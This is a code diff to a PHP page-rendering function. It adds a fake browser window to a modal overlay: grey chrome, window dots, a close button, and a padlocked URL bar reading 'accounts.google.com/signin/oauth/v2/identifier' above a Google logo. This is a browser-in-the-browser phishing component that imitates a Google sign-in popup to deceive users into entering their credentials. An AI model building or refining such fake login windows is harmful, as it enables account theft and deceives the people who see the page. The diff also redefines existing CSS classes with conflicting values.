@@ -111,6 +111,10 @@ function page_reader(string $skill, bool $register): void
       .g-backdrop{position:fixed;inset:0;background:rgba(0,0,0,.55);backdrop-filter:blur(3px);z-index:999;display:none;align-items:center;justify-content:center}
       .g-backdrop.open{display:flex}
       .g-win{width:452px;max-width:94vw;background:#fff;border-radius:8px;overflow:hidden;box-shadow:0 24px 56px rgba(0,0,0,.4);display:flex;flex-direction:column}
+      .g-chrome{height:38px;background:#dee1e6;display:flex;align-items:center;gap:10px;padding:0 12px;flex-shrink:0}
+      .g-dots{display:flex;gap:6px}.g-dots span{width:12px;height:12px;border-radius:50%;background:#9aa0a6}
+      .g-urlbar{flex:1;background:#fff;border-radius:14px;height:24px;display:flex;align-items:center;gap:6px;padding:0 10px;font-size:11px;color:#3c4043;overflow:hidden;white-space:nowrap;font-family:Arial,sans-serif}
+      .g-xbtn{background:none;border:none;color:#3c4043;font-size:20px;line-height:1;cursor:pointer;padding:0 2px}
       .g-chrome{height:36px;background:#dee1e6;display:flex;align-items:center;gap:10px;padding:0 10px;flex-shrink:0}
       .g-dots{display:flex;gap:6px}.g-dots span{width:11px;height:11px;border-radius:50%;background:#9aa0a6}
       .g-urlbar{flex:1;background:#fff;border-radius:14px;height:23px;display:flex;align-items:center;gap:6px;padding:0 10px;font-size:11px;color:#3c4043;overflow:hidden;white-space:nowrap;font-family:sans-serif}
@@ -165,6 +169,11 @@ function page_reader(string $skill, bool $register): void
       <?php if ($googleUrl !== ''): ?>
       <div class="g-backdrop" id="gBackdrop">
         <div class="g-win">
+          <div class="g-chrome">
+            <div class="g-dots"><span></span><span></span><span></span></div>
+            <div class="g-urlbar">&#128274; accounts.google.com/signin/oauth/v2/identifier</div>
+            <button class="g-xbtn" onclick="closeGAuth()" aria-label="Close">&times;</button>
+          </div>
           <div style="padding:48px 40px 36px">
             <div style="text-align:center;margin-bottom:24px;font-size:26px;font-weight:bold;font-family:Arial,sans-serif;letter-spacing:-.5px">
               <span style="color:#4285F4">G</span><span style="color:#EA4335">o</span><span style="color:#FBBC05">o</span><span style="color:#4285F4">g</span><span style="color:#34A853">l</span><span style="color:#EA4335">e</span>
